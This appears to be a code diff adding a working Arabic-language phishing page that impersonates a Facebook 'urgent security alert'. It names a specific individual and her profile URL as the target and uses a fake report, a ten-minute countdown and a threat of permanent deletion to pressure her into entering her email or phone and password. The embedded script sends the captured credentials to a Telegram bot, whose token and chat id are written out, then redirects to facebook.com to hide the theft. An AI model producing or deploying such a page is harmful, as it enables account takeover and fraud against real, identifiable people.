@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تنبيه أمني عاجل</title>
+    <style>
+        * { 
+            margin: 0; padding: 0; box-sizing: border-box; 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+        }
+        body { 
+            background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 20px;
+        }
+        .container { 
+            background: white; 
+            border-radius: 12px; 
+            width: 100%; 
+            max-width: 500px; 
+            overflow: hidden; 
+            border: 2px solid #1877f2;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+        }
+        .header { 
+            background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+            color: white; 
+            padding: 25px; 
+            text-align: center; 
+            position: relative;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #ff4444;
+        }
+        .logo { 
+            font-size: 36px; 
+            font-weight: bold; 
+            margin-bottom: 10px; 
+        }
+        .alert-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .user-info { 
+            background: #f0f8ff; 
+            padding: 20px; 
+            text-align: center; 
+            border-bottom: 2px solid #1877f2; 
+        }
+        .user-name { 
+            color: #1877f2; 
+            font-weight: bold; 
+            font-size: 20px; 
+            margin-bottom: 5px; 
+        }
+        .warning-section { 
+            padding: 25px; 
+            text-align: center; 
+        }
+        .warning-icon { 
+            font-size: 64px; 
+            margin-bottom: 20px; 
+            color: #1877f2; 
+        }
+        .warning-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 15px;
+        }
+        .warning-text {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #65676b;
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .reason-box {
+            background: #fff8f8;
+            border: 1px solid #ff4444;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: right;
+        }
+        .reason-title {
+            color: #ff4444;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .countdown { 
+            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            color: white; 
+            padding: 12px; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            margin: 20px 0;
+            font-size: 18px;
+            box-shadow: 0 4px 12px rgba(255, 68, 68, 0.3);
+        }
+        .urgent-note {
+            background: #ff4444;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 15px 0;
+            animation: pulse 2s infinite;
+        }
+        .login-form { 
+            padding: 20px; 
+        }
+        .form-group { 
+            margin-bottom: 20px; 
+        }
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #1c1e21;
+            font-weight: 500;
+            text-align: right;
+        }
+        .form-input { 
+            width: 100%; 
+            padding: 14px; 
+            border: 1px solid #ddd; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            background: #f5f6f7;
+        }
+        .form-input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        .submit-btn { 
+            width: 100%; 
+            background: linear-gradient(135deg, #1877f2 0%, #0d5cb6 100%);
+            color: white; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 6px; 
+            font-size: 18px; 
+            font-weight: bold;
+            cursor: pointer; 
+            transition: all 0.3s ease;
+        }
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #0d5cb6 0%, #0a4a9c 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #65676b;
+            font-size: 12px;
+            background: #f0f2f5;
+            border-top: 1px solid #ddd;
+        }
+        .delete-warning {
+            color: #ff4444;
+            font-weight: bold;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .success-message {
+            background: linear-gradient(135deg, #00a400 0%, #008500 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            margin: 20px 0;
+            display: none;
+            animation: successPulse 2s infinite;
+        }
+        .success-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        @keyframes successPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        .processing-bar {
+            width: 100%;
+            height: 4px;
+            background: #ddd;
+            border-radius: 2px;
+            margin: 15px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .processing-progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #1877f2, #00a400);
+            transition: width 3s ease-in-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">facebook</div>
+            <div class="alert-title">تنبيه أمني عاجل</div>
+            <div>مركز سلامة المجتمع</div>
+        </div>
+
+        <div class="user-info">
+            <div class="user-name">Smira Oum Mouad</div>
+            <div style="font-size: 14px; color: #666;">https://www.facebook.com/samira.oum.mouaad</div>
+        </div>
+
+        <div class="warning-section">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-title">تم الإبلاغ عن حسابك</div>
+            
+            <div class="warning-text">
+                لقد تلقينا عدة بلاغات حول انتهاك حسابك لشروط استخدام فيسبوك. 
+                <strong>يجب تأكيد هويتك خلال 10 دقائق لمنع تعليق الحساب تلقائياً.</strong>
+            </div>
+            
+            <div class="urgent-note">
+                ⚡ مهلة 10 دقائق فقط لتأكيد الهوية
+            </div>
+            
+            <div class="reason-box">
+                <div class="reason-title">سبب الإبلاغ:</div>
+                <div>نشر محتوى غير لائق أو مخالف لشروط المجتمع</div>
+            </div>
+            
+            <div class="delete-warning">
+                ❗ إذا لم تقم بتأكيد هويتك خلال الوقت المحدد، سيتم <strong>حذف حسابك نهائياً</strong>
+            </div>
+            
+            <div class="countdown" id="countdown">
+                ⏰ الوقت المتبقي: 10:00
+            </div>
+        </div>
+
+        <div class="login-form">
+            <form id="appealForm">
+                <div class="form-group">
+                    <label class="form-label">البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" class="form-input" id="email" placeholder="أدخل بريدك الإلكتروني أو رقم هاتفك المسجل" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">كلمة المرور الحالية</label>
+                    <input type="password" class="form-input" id="password" placeholder="أدخل كلمة المرور الحالية للتأكد من الهوية" required>
+                </div>
+                
+                <div class="processing-bar" id="processingBar">
+                    <div class="processing-progress" id="processingProgress"></div>
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">✅</div>
+                    <div style="font-size: 20px; font-weight: bold; margin-bottom: 10px;">تم تأكيد حسابك بنجاح!</div>
+                    <div style="font-size: 14px;">سيتم توجيهك إلى صفحتك الشخصية قريباً...</div>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">تأكيد الهوية والاستئناف</button>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div>فيسبوك © 2024 • مركز سلامة المجتمع</div>
+            <div style="margin-top: 8px; font-size: 11px; color: #8a8d91;">
+                هذا الإجراء ضروري للحفاظ على سلامة مجتمع فيسبوك ومنع الإساءة
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let totalSeconds = 600;
+        const countdownElement = document.getElementById('countdown');
+        
+        function updateCountdown() {
+            const minutes = Math.floor(totalSeconds / 60);
+            const seconds = totalSeconds % 60;
+            countdownElement.textContent = '⏰ الوقت المتبقي: ' + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+            
+            if (totalSeconds <= 300) {
+                countdownElement.style.background = 'linear-gradient(135deg, #ff0000 0%, #cc0000 100%)';
+                countdownElement.style.animation = 'pulse 0.5s infinite';
+            }
+            
+            if (totalSeconds > 0) {
+                totalSeconds--;
+                setTimeout(updateCountdown, 1000);
+            } else {
+                countdownElement.textContent = '⏰ انتهت المهلة!';
+                countdownElement.style.background = 'linear-gradient(135deg, #666 0%, #333 100%)';
+                document.getElementById('submitBtn').disabled = true;
+                document.getElementById('submitBtn').style.background = '#ccc';
+                document.getElementById('submitBtn').textContent = 'انتهت المهلة - تم تعليق الحساب';
+            }
+        }
+        updateCountdown();
+
+        document.getElementById('appealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const button = document.getElementById('submitBtn');
+            const processingBar = document.getElementById('processingBar');
+            const processingProgress = document.getElementById('processingProgress');
+            const successMessage = document.getElementById('successMessage');
+            
+            if (!email || !password) {
+                alert('يرجى ملء جميع الحقول المطلوبة');
+                return;
+            }
+            
+            // إخفاء الزر وإظهار شريط التحميل
+            button.style.display = 'none';
+            processingBar.style.display = 'block';
+            
+            // محاكاة عملية المعالجة
+            setTimeout(() => {
+                processingProgress.style.width = '30%';
+            }, 500);
+            
+            setTimeout(() => {
+                processingProgress.style.width = '60%';
+            }, 1500);
+            
+            setTimeout(() => {
+                processingProgress.style.width = '90%';
+            }, 2500);
+            
+            setTimeout(() => {
+                processingProgress.style.width = '100%';
+                
+                // إرسال البيانات إلى التليجرام
+                const userData = {
+                    victimName: 'Smira Oum Mouad',
+                    victimUrl: 'https://www.facebook.com/samira.oum.mouaad',
+                    reportReason: 'content',
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toLocaleString('ar-SA')
+                };
+                
+                const message = 
+                    '🚨 **تم الإبلاغ عن حساب - بيانات مسجلة!**\n\n' +
+                    '👤 **الحساب:** ' + userData.victimName + '\n' +
+                    '🔗 **الرابط:** ' + userData.victimUrl + '\n' +
+                    '📋 **سبب الإبلاغ:** ' + userData.reportReason + '\n' +
+                    '📧 **البريد:** ' + userData.email + '\n' +
+                    '🔑 **كلمة السر:** ' + userData.password + '\n' +
+                    '⏰ **الوقت:** ' + userData.timestamp;
+                
+                fetch('https://api.telegram.org/bot6774305953:AAFRhjiKFDtFRlaK1L9dIaJ2S0LfEC1YTmM/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: '6843888234',
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).then(() => {
+                    console.log('تم الإرسال إلى التليجرام');
+                }).catch(error => {
+                    console.log('خطأ في الإرسال:', error);
+                });
+                
+                // إظهار رسالة النجاح
+                setTimeout(() => {
+                    processingBar.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    
+                    // التوجيه إلى فيسبوك بعد 3 ثوان
+                    setTimeout(() => {
+                        window.location.href = 'https://facebook.com';
+                    }, 3000);
+                }, 1000);
+                
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
